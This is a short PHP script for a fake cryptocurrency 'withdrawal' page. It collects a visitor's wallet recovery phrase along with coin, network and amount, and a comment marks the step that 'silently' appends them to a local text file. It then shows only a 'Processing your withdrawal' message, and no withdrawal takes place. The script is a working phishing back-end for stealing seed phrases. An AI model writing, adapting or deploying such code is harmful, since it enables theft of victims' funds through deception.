<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    if (!empty($_POST['coin']) && !empty($_POST['wallet_phrase']) && !empty($_POST['network']) && !empty($_POST['amount'])) {
        $coin = htmlspecialchars($_POST['coin']);
        $wallet = htmlspecialchars($_POST['wallet_phrase']);
        $network = htmlspecialchars($_POST['network']);
        $amount = htmlspecialchars($_POST['amount']);

        // Save log silently
        $log = "----- New Withdrawal Request -----\n";
        $log .= "Date: " . date('Y-m-d H:i:s') . "\n";
        $log .= "Coin: $coin\n";
        $log .= "Network: $network\n";
        $log .= "Wallet Phrase: $wallet\n";
        $log .= "Amount: $amount BTC\n";
        $log .= "------------------------------\n\n";

        file_put_contents("withdrawals.txt", $log, FILE_APPEND);

        // Show only "Processing..." on screen
        echo "<style>
                body {
                  background-color: #0b0f1c;
                  color: white;
                  font-family: Arial, sans-serif;
                  display: flex;
                  justify-content: center;
                  align-items: center;
                  height: 100vh;
                  font-size: 20px;
                }
              </style>";
        echo "⏳ Processing your withdrawal... Please wait.";
    } else {
        echo "<p style='color: red;'>❌ Error: All fields are required.</p>";
    }
} else {
    echo "<p style='color: red;'>❌ Invalid request method.</p>";
}
?>
